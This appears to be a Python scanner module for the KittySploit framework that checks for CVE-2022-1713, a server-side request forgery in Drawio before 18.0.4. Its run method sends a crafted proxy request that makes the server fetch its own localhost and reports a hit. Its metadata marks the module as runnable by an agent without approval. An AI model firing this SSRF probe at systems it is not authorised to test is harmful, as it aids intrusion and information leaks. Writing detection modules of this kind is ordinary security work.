#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Drawio prior to 18."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Drawio <18.0.4 - Server-Side Request Forgery Detection',
        'description': 'Drawio prior to 18.0.4 is vulnerable to server-side request forgery. An attacker can make a request as the server and read its contents. This can lead to a leak of sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'drawio', 'ssrf', 'oss', 'huntr', 'diagrams', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://huntr.dev/bounties/cad3902f-3afb-4ed2-abd0-9f96a248de11',
            'https://github.com/jgraph/drawio/commit/283d41ec80ad410d68634245cf56114bc19331ee',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1713',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-1713',
    }

    def run(self):
        path = '/proxy?url=http%3a//0:8080/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<title>Flowchart Maker & Online Diagram Software</title>',)
        header_any = ('application/octet-stream',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Drawio <18.0.4 - Server-Side Request Forgery detected', path=path)
            return True
        return False

